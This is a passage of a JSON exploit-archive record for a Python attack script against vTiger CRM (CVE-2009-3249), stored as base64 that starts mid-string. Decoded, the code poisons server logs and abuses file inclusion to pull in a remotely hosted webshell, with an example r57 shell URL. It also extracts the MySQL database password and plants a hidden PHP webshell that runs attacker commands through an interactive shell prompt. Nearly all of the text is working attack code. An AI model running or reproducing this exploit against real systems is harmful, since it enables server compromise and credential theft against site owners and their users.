NlciBTaGVsbCAgICAgICAgICAgDQpbK10gMi4gVlRpZ2VyIE15U1FMIFBhc3N3b3JkDQpbK10gMy4gUEhQIFdlYlNoZWxsDQoJCScnJw0KICAgICAgICAJd2luQ2hvaWNlID0gcmF3X2lucHV0KCI+PiBFbnRlciB5b3VyIGNob2ljZTogIikNCiAgICAgICAgCWlmIHdpbkNob2ljZSA9PSAnMSc6DQogICAgICAgICAgICAJCXRyeToNCiAgICAgICAgICAgICAgICAJCWxvZ0luamVjdCgiaW5jbHVkZVBheWxvYWQiKQ0KICAgICAgICAgICAgICAgIAkJcHJpbnQgIlsrXSBFeGFtcGxlOiBodHRwOi8vd3d3Lnhmb2N1cy5uZXQucnUvc29mdC9yNTcudHh0Ig0KICAgICAgICAgICAgICAgIAkJcmZpID0gcmF3X2lucHV0KCc+Pj4gRW50ZXIgWW91ciBSZW1vdGUgV2Vic2hlbGwgVVJMOiAnKQ0KICAgICAgICAgICAgICAgIAkJd2ViYnJvd3Nlci5vcGVuKHVybC5zY2hlbWUrIjovLyIrdXJsLm5ldGxvYysiOiIrc3RyKG9wdGlvbnMucG9ydCkrdXJsLnBhdGgrdnVsbldlYlBhZ2Urd2luTG9ncysiJTAwIisiJmNtZD0iK2Jhc2U2NC5iNjRlbmNvZGUocmZpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBDaGVjayBZb3VyIFdlYiBCcm93c2VyISINCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAJCXByaW50ICJbLV0gUkZJIEAgJXMgRGlkIE5vdCBXb3JrIiAlIHJmaQ0KCQlpZiB3aW5DaG9pY2UgPT0gIjIiOg0KCQkJZiA9IGxmaVJlcXVlc3QodnRQbGF0Zm9ybUxvZykNCgkJCXBhdEZpbmRlciA9IHJlLmNvbXBpbGUoJ1BPU1RcWyJkYl9wYXNzd29yZCJcXTwvdGQ+PHRkIGNsYXNzPSJ2Ij4oLiopPC90ZD4nKSANCgkJCWZpbmRVc2VyID0gcGF0RmluZGVyLnNlYXJjaChmKQ0KCQkJaWYgZmluZFVzZXIgaXMgTm9uZToNCgkJCQlwcmludCAnWy1dIERpZCBOb3QgRmluZCBNeVNRTCBEYXRhYmFzZSBQYXNzd29yZCcNCgkJCWVsc2U6DQoJCQkJcHJpbnQgIlshXSBWVGlnZXIgUGFzc3dvcmQ6ICIrZmluZFVzZXIuZ3JvdXAoMSkNCgkJaWYgd2luQ2hvaWNlID09ICIzIjoNCgkJCWxvZ0luamVjdCgic3lzdGVtUGF5bG9hZCIpDQoJCQlzaGVsbE5hbWUgPSByYXdfaW5wdXQoJ1s/XSBOYW1lIE9mIFlvdXIgV2Vic2hlbGw6ICcpDQoJCQlzeXN0ZW1Db21tYW5kID0gImVjaG8gXjw/cGhwO3N5c3RlbShiYXNlNjRfZGVjb2RlKCRfUkVRVUVTVFtjYXRdKSk7P14+ID4gY2FjaGUvLiVzLnBocCIgJSBzaGVsbE5hbWUNCgkJCWVuY29kZWRDbWQgPSBiYXNlNjQuYjY0ZW5jb2RlKHN5c3RlbUNvbW1hbmQpDQoJCQlyZWFkRnJvbUFjY2Vzc0xvZ3MoZW5jb2RlZENtZCwgd2luTG9ncykgICAgICAJCQ0KCQkJcHJpbnQgIlshXSBDcmVhdGVkIFdlYlNoZWxsIC4lcy5waHAiICUgc2hlbGxOYW1lDQoJCQlzaGVsbE1lc3NhZ2Uoc2hlbGxOYW1lKQ0KCQkJd2hpbGUgVHJ1ZToNCgkJCQl0cnk6IA0KCQkJCQljb21tYW5kID0gcmF3X2lucHV0KGNvbW1hbmRMaW5lKSANCgkJCQkJZW5jb2RlZENtZCA9IGJhc2U2NC5iNjRlbmNvZGUoY29tbWFuZCkNCgkJCQkJcG9zdFJlcXVlc3RXZWJTaGVsbChzaGVsbE5hbWUsZW5jb2RlZENtZCkNCgkJCQlleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQoJCQkJCWVuY29kZWRDbWQgPSBiYXNlNjQuYjY0ZW5jb2RlKCdkZWwgLicrc2hlbGxOYW1lKycucGhwJykNCgkJCQkJcG9zdFJlcXVlc3RXZWJTaGVsbChzaGVsbE5hbWUsZW5jb2RlZENtZCkNCgkJCQkJcHJpbnQgIlstXSBDVFJMK0MgRGV0ZWN0ZWQhIg0KCQkJCQlwcmludCAiWytdIFJlbW92ZWQgLiVzLnBocFxuIiAlIHNoZWxsTmFtZQ0KCQkJCQlzeXMuZXhpdCgpDQppZiAiX19tYWluX18iID09IF9fbmFtZV9fOg0KCWJhbm5lcigpDQogICAgICAgIHByb3h5Q2hlY2soKQ0KCXRyeToNCgkgICAgICAgIHVybD11cmxwYXJzZShhcmdzWzBdKQ0KCWV4Y2VwdDoNCgkJaWYgb3B0aW9ucy5maWxlOg0KCQkJcHJpbnQgIlsrXSBVc2luZyBXZWJzaXRlIExpc3QiDQoJCQl1cmwsbnVtbGluZXMgPSB3ZWJzaXRlTGlzdChvcHRpb25zLmZpbGUpDQoJCWVsc2U6DQoJCQlwYXJzZXIucHJpbnRfaGVscCgpDQogICAgICAgICAgICAgICAgCXByaW50ICJcblstXSBDaGVjayBZb3VyIFVSTFxuIgkNCgkJCXN5cy5leGl0KDEpDQoJaWYgbm90IHVybC5zY2hlbWU6DQoJCXByaW50IHVzYWdlKyJcbiINCgkJcHJpbnQgIlstXSBNaXNzaW5nIEhUVFAvSFRUUFNcbiINCgkJc3lzLmV4aXQoMSkNCgljb21tYW5kTGluZSA9ICgnW1JTSEVMTF0gJXNAJXMjICcpICUgKGdldHBhc3MuZ2V0dXNlcigpLHVybC5uZXRsb2MpDQoJaWYgbm90IG9wdGlvbnMuZmlsZToNCgkJcHJpbnQgIlsrXSBUYXJnZXQ6ICIrdXJsLnNjaGVtZSsiOi8vIit1cmwubmV0bG9jKyI6IitzdHIob3B0aW9ucy5wb3J0KSt1cmwucGF0aA0KCWZpcnN0TWVudSgp", 
    "filename": "platforms/php/webapps/16280.py", 
    "id": "16280", 
    "cves": [
        "CVE-2009-3249"
    ]
}